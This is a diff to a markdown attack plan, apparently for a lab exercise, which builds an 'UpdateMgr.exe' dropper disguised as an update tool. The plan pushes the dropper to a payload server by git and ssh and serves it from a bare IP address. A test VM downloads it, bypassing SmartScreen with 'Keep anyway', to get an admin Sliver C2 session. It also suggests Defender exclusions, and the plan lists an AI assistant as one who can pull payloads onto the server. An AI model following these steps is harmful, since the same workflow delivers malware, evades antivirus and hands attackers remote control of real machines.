@@ -231,7 +231,17 @@ Expected: `UpdateMgr.exe` appears in the folder.
 Get-Item .\UpdateMgr.exe | Select-Object Name, Length
 ```
 Expected: file exists, a few hundred KB. **Do not double-click it.** Defender on the host may scan/quarantine it — if it vanishes, that's host AV doing its job; add a *temporary* exclusion for this repo folder on the host, rebuild, remove the exclusion after Task 5.
-Report: confirm file exists.
+- [ ] **Step 5: Publish the dropper to the payload server**
+
+Still in the repo folder on Windows:
+```powershell
+git add .\UpdateMgr.exe; git commit -m "Add UpdateMgr dropper exe"; git push
+```
+Then pull it on the VPS (or ask Claude):
+```bash
+ssh jason@100.125.52.98 'cd ~/payloads && git pull'
+```
+Expected: `http://2.25.141.57/UpdateMgr.exe` is served. Report: confirm file exists.
 
 ---
 
@@ -240,12 +250,12 @@ Report: confirm file exists.
 **Files:** none new (execution + observation)
 
 **Interfaces:**
-- Consumes: `UpdateMgr.exe` (Task 4), HTTP payload + listener (Tasks 1–2).
+- Consumes: `UpdateMgr.exe` (Task 4, served over HTTP), HTTP payload + listener (Tasks 1–2).
 - Produces: live Sliver session as the VM's admin user.
 
-- [ ] **Step 1: Carry `UpdateMgr.exe` into the VM**
+- [ ] **Step 1: Download the dropper inside the VM**
 
-Drag-drop / shared clipboard / shared folder — whichever your hypervisor supports. Land it on the VM's Desktop.
+VM browser → `http://2.25.141.57/UpdateMgr.exe` → download. If SmartScreen complains: **More info → Keep anyway**. If *Defender* quarantines it on download, that's the "wrapper got flagged" case — report it.
 
 - [ ] **Step 2: Sanity-check the path first — inside the VM**
 
